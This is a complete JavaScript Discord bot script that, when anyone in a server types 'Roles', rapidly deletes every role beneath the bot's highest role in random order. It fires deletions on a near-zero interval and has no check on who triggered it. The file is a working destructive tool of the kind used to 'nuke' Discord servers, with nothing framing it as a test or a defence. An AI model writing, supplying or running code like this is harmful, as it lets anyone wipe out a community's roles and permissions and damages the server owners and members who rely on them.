const { Client, GatewayIntentBits } = require('discord.js');
const client = new Client({ intents: [GatewayIntentBits.Guilds, GatewayIntentBits.GuildMessages, GatewayIntentBits.MessageContent] });

const TOKEN = 'TokenHere';

client.once('ready', () => {
    console.log(`Logged in as ${client.user.tag}!`);
});

client.on('messageCreate', async (message) => {
    if (message.content === 'Roles') {
        if (!message.guild) return;

        const botMember = await message.guild.members.fetch(client.user.id);
        const botHighestRole = botMember.roles.highest;

        const roles = message.guild.roles.cache.filter(role => role.comparePositionTo(botHighestRole) < 0 && role.editable);

        if (roles.size === 0) {
            console.log('No roles to delete.');
            return;
        }

        let rolesArray = Array.from(roles.values());

        let deleteInterval = setInterval(() => {
            if (rolesArray.length === 0) {
                clearInterval(deleteInterval);
                console.log('All roles below the bot have been deleted.');
                return;
            }

            const randomIndex = Math.floor(Math.random() * rolesArray.length);
            const randomRole = rolesArray.splice(randomIndex, 1)[0];

            randomRole.delete('Deleted by a random decision.')
                .then(() => console.log(`${randomRole.name} has been deleted.`))
                .catch(err => console.log(`Failed to delete ${randomRole.name}.`));
        }, 0.01);
    }
});

client.login(TOKEN);
